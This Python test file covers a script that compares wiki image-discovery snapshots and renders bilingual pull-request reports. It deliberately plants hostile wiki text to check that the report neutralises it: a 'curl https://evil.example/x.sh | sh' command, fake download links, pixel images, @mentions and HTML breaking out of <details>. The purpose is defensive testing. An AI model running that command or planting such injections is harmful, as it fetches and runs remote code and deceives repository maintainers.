"""Checks for the wiki discovery comparison used by the scheduled source check."""

import hashlib
import importlib.util
import json
import re
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

SPEC = importlib.util.spec_from_file_location("check_sources", Path(__file__).resolve().parents[1] / "scripts/check_sources.py")
check = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(check)

NO_CHANGE = {"added": 0, "reuploaded": 0, "removed": 0, "added_after_baseline": 0}
# Han characters plus CJK / full-width punctuation such as （）：，。
CHINESE = re.compile(r"[\u3000-\u303f\u3400-\u4dbf\u4e00-\u9fff\uf900-\ufaff\uff00-\uffef]")
DETAILS = "\n<details>\n<summary>简体中文</summary>\n\n"
WIKI = {"fandom": "https://deemo.fandom.com/wiki/", "bwiki": "https://wiki.biligame.com/deemo/"}
# Text a wiki editor could put into a song title, collection name or file title.
HOSTILE = ("@octocat see FridrichMethod/deemo#1 and #2 [Download fixed images](https://evil.example/x) "
           "![](https://evil.example/pixel.png) <img src=x> </details> <!-- **run `curl https://evil.example/x.sh | sh` "
           "first** www.evil.example ~~x~~ :+1: a\\|b ``` trailing\\")
# Markdown or HTML syntax that must not survive outside code spans in a rendered table cell.
ACTIVE = re.compile(r"[@#<>\[\]!*_~`\\|]|https?:|www\.", re.I)
# A link the report itself makes to a file page on one of the two wikis, after its text was replaced by without_code_spans.
OWN_LINK = re.compile(r"\[\x00\]\(<https://(?:deemo\.fandom\.com|wiki\.biligame\.com)/[^<>\s|`\\]*>\)")


def split_languages(markdown):
    """Split a bilingual report into its English part and the Chinese copy inside <details>."""
    english, chinese = markdown.split(DETAILS)
    assert chinese.endswith("\n</details>\n"), chinese[-40:]
    return english, chinese[:-len("\n</details>\n")]


def without_code_spans(text):
    """Replace every CommonMark code span with NUL, keeping unmatched backtick runs as literal text."""
    output, position = [], 0
    while True:
        opening = re.compile(r"`+").search(text, position)
        if not opening:
            return "".join(output) + text[position:]
        output.append(text[position:opening.start()])
        closing = next((run for run in re.finditer(r"`+", text[opening.end():]) if len(run.group()) == len(opening.group())), None)
        if closing is None:
            output.append(opening.group())
            position = opening.end()
        else:
            output.append("\0")
            position = opening.end() + closing.end()


def table_cells(line):
    """Split a table row as GitHub does, on pipes not escaped with a backslash, then unescape the cells."""
    return [cell.strip().replace("\\|", "|") for cell in re.split(r"(?<!\\)\|", line.strip())[1:-1]]


def candidate(source, name, sha1="a" * 40, size=1000, width=1024, height=1024, timestamp="2026-01-01T00:00:00Z", **extra):
    return {
        "source": source, "file_title": f"File:{name}", "kind": extra.pop("kind", "song_art"),
        "info": {"sha1": sha1, "size": size, "width": width, "height": height, "timestamp": timestamp,
                 "descriptionurl": extra.pop("page_url", f"{WIKI[source]}File:{name}")},
        "song_titles": extra.pop("song_titles", [name.rsplit(".", 1)[0]]), "collections": extra.pop("collections", []),
        **extra,
    }


def snapshot(*candidates, fetched_at="2026-02-02T00:00:00Z"):
    return {"schema_version": 1, "fetched_at": fetched_at, "candidates": list(candidates)}


class CompareTests(unittest.TestCase):
    def setUp(self):
        self.manifest = {"assets": [{
            "id": "wikis:fandom:" + hashlib.sha256(b"File:Kept.png").hexdigest()[:16],
            "path": "assets/public/wikis/fandom/Kept--abc.png", "wiki_original_sha1_matches": True,
        }, {
            "id": "wikis:bwiki:" + hashlib.sha256("文件:Gone.png".encode()).hexdigest()[:16],
            "path": "assets/public/wikis/bwiki/Gone--def.png", "wiki_original_sha1_matches": False,
        }]}

    def test_identical_snapshots_report_no_change(self):
        same = snapshot(candidate("fandom", "Kept.png"))
        report = check.compare(same, snapshot(candidate("fandom", "Kept.png"), fetched_at="2026-03-03T00:00:00Z"), self.manifest)
        self.assertFalse(report["changed"])
        self.assertEqual(report["counts"], {**NO_CHANGE, "baseline": 1, "current": 1})
        self.assertEqual(check.render(report), (
            "## Wiki source check\n\n"
            "Baseline snapshot 2026-02-02T00:00:00Z (1 candidate) → current discovery 2026-03-03T00:00:00Z (1 candidate).\n\n"
            "- 0 added (0 of them uploaded after the baseline) · 0 re-uploaded · 0 removed\n\n"
            "The candidate set has not changed; nothing to do.\n"))
        self.assertEqual(check.render(report, "zh-CN"), (
            "## Wiki 来源检查\n\n"
            "基线快照 2026-02-02T00:00:00Z（1 个候选）→ 本次发现 2026-03-03T00:00:00Z（1 个候选）。\n\n"
            "- 新增 0（其中 0 个在基线之后上传）· 重新上传 0 · 移除 0\n\n"
            "候选集合没有变化，无需处理。\n"))
        self.assertEqual(report["title"], "Wiki source update: 0 added · 0 re-uploaded · 0 removed (2026-03-03)")
        for markdown in split_languages(check.render_bilingual(report)):
            self.assertNotIn("### ", markdown)

    def test_added_reuploaded_and_removed_candidates(self):
        baseline = snapshot(candidate("fandom", "Kept.png"), candidate("bwiki", "Gone.png"), candidate("fandom", "Same.png"))
        current = snapshot(candidate("fandom", "Kept.png", sha1="b" * 40, size=2000, width=2048, height=2048, timestamp="2026-02-10T00:00:00Z"),
                           candidate("fandom", "Same.png"), candidate("bwiki", "Old.png", width=180, height=180),
                           candidate("bwiki", "New.png", kind="collection_cover", collections=["Pack"], timestamp="2026-02-20T00:00:00Z"))
        report = check.compare(baseline, current, self.manifest)
        self.assertTrue(report["changed"])
        self.assertEqual(report["counts"], {"added": 2, "reuploaded": 1, "removed": 1, "added_after_baseline": 1, "baseline": 3, "current": 4})
        self.assertEqual(report["title"], "Wiki source update: 2 added · 1 re-uploaded · 1 removed (2026-02-02)")
        self.assertNotRegex(report["title"], CHINESE)
        new, old = report["added"]
        self.assertEqual((new["file_title"], new["local_path"], new["uploaded_after_baseline"]), ("File:New.png", None, True))
        self.assertEqual((old["file_title"], old["uploaded_after_baseline"]), ("File:Old.png", False))
        reuploaded, = report["reuploaded"]
        self.assertEqual((reuploaded["previous"]["sha1"], reuploaded["sha1"]), ("a" * 40, "b" * 40))
        self.assertEqual(reuploaded["local_path"], "assets/public/wikis/fandom/Kept--abc.png")
        self.assertTrue(reuploaded["local_sha1_matched_wiki"])
        removed, = report["removed"]
        self.assertEqual(removed["file_title"], "File:Gone.png")
        markdown = check.render(report)
        self.assertIn("Baseline snapshot 2026-02-02T00:00:00Z (3 candidates) → current discovery 2026-02-02T00:00:00Z (4 candidates).", markdown)
        self.assertIn("- 2 added (1 of them uploaded after the baseline) · 1 re-uploaded · 1 removed", markdown)
        self.assertIn("### Added (2)", markdown)
        self.assertIn("| Source | File | Type | Dimensions | Size | Uploaded | Song title / collection |", markdown)
        self.assertIn("### Re-uploaded (1)", markdown)
        self.assertIn("| Source | File | Dimensions | Size | Wiki SHA-1 | Uploaded | Local file |", markdown)
        self.assertIn("### Removed (1)\n\n| Source | File | Local file |", markdown)
        self.assertIn("| BWIKI | [`New.png`](<https://wiki.biligame.com/deemo/File:New.png>) | `collection_cover` | 1024×1024 | 0.00 MiB | "
                      "2026-02-20 (after baseline) | `New` / `Pack` |", markdown)
        self.assertIn("180×180 ⚠ small image", markdown)
        self.assertIn("| 1024×1024 → 2048×2048 | 0.00 MiB → 0.00 MiB | `aaaaaaaaaa` → `bbbbbbbbbb` | "
                      "2026-02-10 (after baseline) |", markdown)
        self.assertIn("`assets/public/wikis/fandom/Kept--abc.png` (SHA-1 matched at download)", markdown)
        self.assertIn("| BWIKI | [`Gone.png`](<https://wiki.biligame.com/deemo/File:Gone.png>) | none |", markdown)
        self.assertIn("### Local steps after merging", markdown)
        self.assertNotRegex(markdown, CHINESE)
        english, chinese = split_languages(check.render_bilingual(report))
        self.assertEqual((english, chinese), (markdown, check.render(report, "zh-CN")))
        for text in ("## Wiki 来源检查", "基线快照 2026-02-02T00:00:00Z（3 个候选）→ 本次发现 2026-02-02T00:00:00Z（4 个候选）。",
                     "- 新增 2（其中 1 个在基线之后上传）· 重新上传 1 · 移除 1", "### 新增（2）", "### 重新上传（1）", "### 移除（1）",
                     "| 来源 | 文件 | 类型 | 尺寸 | 大小 | 上传时间 | 曲名 / 曲包 |",
                     "| 来源 | 文件 | 尺寸 | 大小 | Wiki SHA-1 | 上传时间 | 本地文件 |", "| 来源 | 文件 | 本地文件 |",
                     "180×180 ⚠小图", "2026-02-20（基线之后）", "`aaaaaaaaaa` → `bbbbbbbbbb`",
                     "`assets/public/wikis/fandom/Kept--abc.png`（SHA-1 曾一致）",
                     "| BWIKI | [`Gone.png`](<https://wiki.biligame.com/deemo/File:Gone.png>) | 无 |", "### 合并后的本地步骤",
                     "合并此 PR 只更新发现快照，不包含任何图片。随后在本地执行："):
            self.assertIn(text, chinese)
        self.assertNotIn("<details>", chinese)

    def test_bwiki_titles_resolve_local_assets(self):
        baseline = snapshot(candidate("bwiki", "Gone.png"))
        baseline["candidates"][0]["file_title"] = "文件:Gone.png"
        report = check.compare(baseline, snapshot(), self.manifest)
        self.assertEqual(report["removed"][0]["local_path"], "assets/public/wikis/bwiki/Gone--def.png")
        self.assertIn("| BWIKI | [`Gone.png`](<https://wiki.biligame.com/deemo/File:Gone.png>) | "
                      "`assets/public/wikis/bwiki/Gone--def.png` (SHA-1 did not match at download) |", check.render(report))
        self.assertIn("| BWIKI | [`Gone.png`](<https://wiki.biligame.com/deemo/File:Gone.png>) | "
                      "`assets/public/wikis/bwiki/Gone--def.png`（SHA-1 曾不一致） |", check.render(report, "zh-CN"))

    def test_duplicate_candidates_are_rejected(self):
        with self.assertRaisesRegex(ValueError, "Duplicate"):
            check.compare(snapshot(candidate("fandom", "X.png"), candidate("fandom", "X.png")), snapshot(), {})

    def test_render_escapes_cells_and_limits_rows(self):
        current = snapshot(candidate("fandom", "A|B.png", song_titles=["Song|One"]), candidate("fandom", "C.png"))
        report = check.compare(snapshot(), current, {})
        with patch.object(check, "ROW_LIMIT", 1):
            english, chinese = split_languages(check.render_bilingual(report))
        for markdown, more in ((english, "1 more entry is not listed"), (chinese, "另有 1 项未列出")):
            self.assertIn("[`A\\|B.png`](<https://deemo.fandom.com/wiki/File:A%7CB.png>)", markdown)
            self.assertIn("`Song\\|One`", markdown)
            self.assertIn(more, markdown)
            self.assertIn("fetch_wikis.py --resume", markdown)
            self.assertNotIn("C.png", markdown.split(more)[0])
        self.assertIn("\n\n1 more entry is not listed; see the diff of `data/sources/wiki-discovery.json`.\n", english)
        self.assertIn("\n\n另有 1 项未列出，见 `data/sources/wiki-discovery.json` 的 diff。\n", chinese)
        with patch.object(check, "ROW_LIMIT", 0):
            self.assertIn("2 more entries are not listed;", check.render(report))

    def test_wiki_controlled_text_is_inert(self):
        """Wiki text cannot add mentions, references, links, images, HTML, table cells or close <details>."""
        file_name = "@FridrichMethod please merge `x` *b* <b>bold</b> | [y](https://evil.example) ![](https://evil.example/p.png)"
        baseline = snapshot(candidate("fandom", "Kept.png"), candidate("bwiki", f"{file_name}.png"))
        current = snapshot(
            candidate("fandom", "Kept.png", sha1="`<img src=x>` @octocat #3", timestamp="@octocat [x](https://evil.example)"),
            candidate("fandom", f"{file_name}\nnext line\r\u202eevil.png", kind=HOSTILE, song_titles=[HOSTILE, "Don`t go"],
                      collections=["RAC Collection #2", "Line\nbreak | cell"], page_url="https://evil.example/login",
                      timestamp="2026-02-20T00:00:00Z"),
            candidate("bwiki", "A b|c<d>`e`(f.png"),
            candidate("fandom", "Source.png"),
            fetched_at="2026-03-03T00:00:00Z")
        current["candidates"][3]["source"] = "</details> @octocat"
        report = check.compare(baseline, current, self.manifest)
        self.assertEqual(report["title"], "Wiki source update: 3 added · 1 re-uploaded · 1 removed (2026-03-03)")
        markdown = check.render_bilingual(report)
        english, chinese = split_languages(markdown)
        outside = OWN_LINK.sub("", without_code_spans(markdown))
        self.assertEqual((outside.count("<details>"), outside.count("</details>")), (1, 1))
        for text in ("evil.example", "@", "<img", "<b>", "<!--", "www.", "![", "](", "\u202e", "\r"):
            self.assertNotIn(text, outside)
        rows = 0
        for part in (english, chinese):
            width = None
            for line in part.splitlines():
                if not line.startswith("|"):
                    width = None
                    continue
                cells = table_cells(line)
                width = width or len(cells)
                self.assertEqual(len(cells), width, line)
                for cell in cells:
                    self.assertNotRegex(OWN_LINK.sub("", without_code_spans(cell)), ACTIVE, line)
                rows += 1
        self.assertEqual(rows, 2 * ((2 + 3) + (2 + 1) + (2 + 1)))
        for part in (english, chinese):
            self.assertIn("| BWIKI | [``A b\\|c<d>`e`(f.png``](<https://wiki.biligame.com/deemo/File:A%20b%7Cc%3Cd%3E%60e%60(f.png>) |", part)
            self.assertIn("| Fandom | ``@FridrichMethod please merge `x` *b* <b>bold</b> \\| [y](https://evil.example) "
                          "![](https://evil.example/p.png) next line evil.png`` | ````@octocat see FridrichMethod/deemo#1 and #2 ", part)
            self.assertIn("| BWIKI | [``@FridrichMethod please merge `x` *b* <b>bold</b> \\| [y](https://evil.example) ![](https://evil.example/p.png).png``]"
                          "(<https://wiki.biligame.com/deemo/File:@FridrichMethod%20please%20merge%20%60x%60%20*b*%20%3Cb%3Ebold%3C/b%3E%20%7C%20"
                          "[y](https://evil.example)%20![](https://evil.example/p.png).png>) |", part)
            self.assertIn(" / ``Don`t go`` / `RAC Collection #2` / `Line break \\| cell` |", part)
            self.assertIn("| `</details> @octocat` | `Source.png` | `song_art` |", part)
        self.assertIn("| 1024×1024 → 1024×1024 | 0.00 MiB → 0.00 MiB | `aaaaaaaaaa` → `` `<img src= `` | ? |", english)

    def test_links_point_only_to_the_source_wiki(self):
        current = snapshot(candidate("fandom", "Evil.png", page_url="https://evil.example/wiki/File:Evil.png"),
                           candidate("fandom", "Http.png", page_url="http://deemo.fandom.com/wiki/File:Http.png"),
                           candidate("bwiki", "Cross.png", page_url="https://deemo.fandom.com/wiki/File:Cross.png"),
                           candidate("fandom", "User.png", page_url="https://user@deemo.fandom.com/wiki/File:User.png"),
                           candidate("fandom", "Port.png", page_url="https://deemo.fandom.com:99999/wiki/File:Port.png"),
                           candidate("fandom", "None.png", page_url=None),
                           candidate("fandom", "Odd (1.png"))
        markdown = check.render(check.compare(snapshot(), current, {}))
        for row in ("| Fandom | `Evil.png` |", "| Fandom | `Http.png` |", "| BWIKI | `Cross.png` |",
                    "| Fandom | `User.png` |", "| Fandom | `Port.png` |", "| Fandom | `None.png` |"):
            self.assertIn(row, markdown)
        self.assertIn("| Fandom | [`Odd (1.png`](<https://deemo.fandom.com/wiki/File:Odd%20(1.png>) |", markdown)
        self.assertEqual(markdown.count("](<"), 1)

    def test_snapshot_times_are_validated(self):
        hostile = "@octocat [x](https://evil.example) #1"
        report = check.compare(snapshot(fetched_at=hostile), snapshot(candidate("fandom", "New.png"), fetched_at=hostile), {})
        self.assertEqual(report["title"], "Wiki source update: 1 added · 0 re-uploaded · 0 removed (unknown-date)")
        self.assertIn(f"Baseline snapshot `{hostile}` (0 candidates) → current discovery `{hostile}` (1 candidate).",
                      check.render(report))
        self.assertNotIn("@", without_code_spans(check.render_bilingual(report)))

    def test_bilingual_report_fits_a_pull_request_body(self):
        names = [f"Fairly long song artwork file title number {number:03d}.png" for number in range(450)]
        manifest = {"assets": [{"id": "wikis:fandom:" + hashlib.sha256(f"File:{name}".encode()).hexdigest()[:16],
                                "path": f"assets/public/wikis/fandom/{name}--0123456789ab.png",
                                "wiki_original_sha1_matches": True} for name in names]}
        baseline = snapshot(*(candidate("fandom", name) for name in names[:300]))
        current = snapshot(*(candidate("fandom", name, sha1="b" * 40) for name in names[150:300]),
                           *(candidate("fandom", name) for name in names[300:]))
        report = check.compare(baseline, current, manifest)
        self.assertEqual((report["counts"]["added"], report["counts"]["reuploaded"], report["counts"]["removed"]), (150, 150, 150))
        self.assertGreater(len(check.render(report)) + len(check.render(report, "zh-CN")), check.REPORT_LIMIT)
        markdown = check.render_bilingual(report)
        self.assertLessEqual(len(markdown), check.REPORT_LIMIT)
        self.assertLess(check.REPORT_LIMIT, 65536)
        english, chinese = split_languages(markdown)
        hidden = [int(count) for count in re.findall(r"^(\d+) more entries are not listed;", english, re.M)]
        self.assertEqual(hidden, [int(count) for count in re.findall(r"^另有 (\d+) 项未列出", chinese, re.M)])
        self.assertEqual(len(hidden), 3)
        self.assertEqual(len(set(hidden)), 1)
        listed = 150 - hidden[0]
        self.assertTrue(0 < listed < check.ROW_LIMIT, listed)
        self.assertEqual((english, chinese), (check.render(report, "en", listed), check.render(report, "zh-CN", listed)))

    def test_next_steps_say_resume_keeps_records_and_files(self):
        statuses = ('"upstream_status": "superseded"', '"upstream_status": "removed"', '"upstream_status": "fetch_failed"')
        for lang, never_deletes in (("en", "never deletes files"), ("zh-CN", "不会删除任何文件")):
            steps = check.TEXT[lang]["next_steps"]
            self.assertIn("fetch_wikis.py --resume", steps)
            self.assertIn(never_deletes, steps)
            for status in statuses + ("`upstream_status`",):
                self.assertIn(status, steps)
        self.assertNotIn("not deleted automatically", check.TEXT["en"]["next_steps"])

    def test_next_steps_rebuild_the_previews_before_the_catalog_and_run_every_test(self):
        # New or re-uploaded originals need grid previews, which the catalog build records and tests/test_thumbnails.py
        # requires; CI runs every tests/test_*.py, so the local steps do too.
        commands = ["scripts/fetch_wikis.py --resume", "scripts/build_thumbnails.py --prune", "scripts/build_catalog.py --verify",
                    'for test in tests/test_*.py; do .venv/bin/python -I "$test" || echo "FAILED: $test"; done']
        for lang in ("en", "zh-CN"):
            with self.subTest(lang=lang):
                block = re.search(r"```sh\n(.*?)```", check.TEXT[lang]["next_steps"], re.DOTALL).group(1)
                lines = block.splitlines()
                self.assertEqual(len(lines), len(commands), block)
                for line, command in zip(lines, commands):
                    self.assertIn(command, line)
                self.assertIn("tests/test_thumbnails.py", check.TEXT[lang]["next_steps"])

    def test_language_tables_match(self):
        english, chinese = check.TEXT["en"], check.TEXT["zh-CN"]
        self.assertEqual(english.keys(), chinese.keys())
        fields = re.compile(r"\{(\w*)\}")

        def forms(value):
            return [value] if isinstance(value, str) else list(value.values() if isinstance(value, dict) else value)

        for key in english:
            if isinstance(english[key], dict):
                self.assertEqual(english[key].keys(), chinese[key].keys(), key)
            placeholders = {tuple(sorted(fields.findall(form))) for form in forms(english[key]) + forms(chinese[key])}
            self.assertEqual(len(placeholders), 1, key)
            self.assertNotRegex("".join(forms(english[key])), CHINESE, key)

    def test_cli_writes_report_and_summary(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "old.json").write_text(json.dumps(snapshot()), encoding="utf-8")
            (root / "new.json").write_text(json.dumps(snapshot(candidate("fandom", "New.png"))), encoding="utf-8")
            argv = ["check_sources", "--baseline", str(root / "old.json"), "--current", str(root / "new.json"),
                    "--manifest", str(root / "missing.json"), "--report", str(root / "report.md"), "--summary", str(root / "summary.json")]
            with patch.object(sys, "argv", argv), patch("builtins.print") as printed:
                check.main()
            summary = json.loads((root / "summary.json").read_text(encoding="utf-8"))
            self.assertEqual(list(summary), ["changed", "title", "counts", "baseline_fetched_at", "current_fetched_at",
                                             "added", "reuploaded", "removed"])
            self.assertTrue(summary["changed"])
            self.assertEqual(summary["counts"]["added"], 1)
            self.assertEqual(summary["title"], "Wiki source update: 1 added · 0 re-uploaded · 0 removed (2026-02-02)")
            markdown = (root / "report.md").read_text(encoding="utf-8")
            self.assertTrue(markdown.startswith("## Wiki source check\n"), markdown[:40])
            english, chinese = split_languages(markdown)
            self.assertIn("### Added (1)", english)
            self.assertIn("| Fandom | [`New.png`](<https://deemo.fandom.com/wiki/File:New.png>) |", english)
            self.assertNotRegex(english, CHINESE)
            self.assertTrue(chinese.startswith("## Wiki 来源检查\n"), chinese[:40])
            self.assertIn("### 新增（1）", chinese)
            self.assertIn('"changed": true', printed.call_args[0][0])
            printed_summary = json.loads(printed.call_args[0][0])
            self.assertEqual(list(printed_summary), ["changed", "title", "counts"])
            self.assertEqual(printed_summary["title"], summary["title"])


if __name__ == "__main__":
    unittest.main()
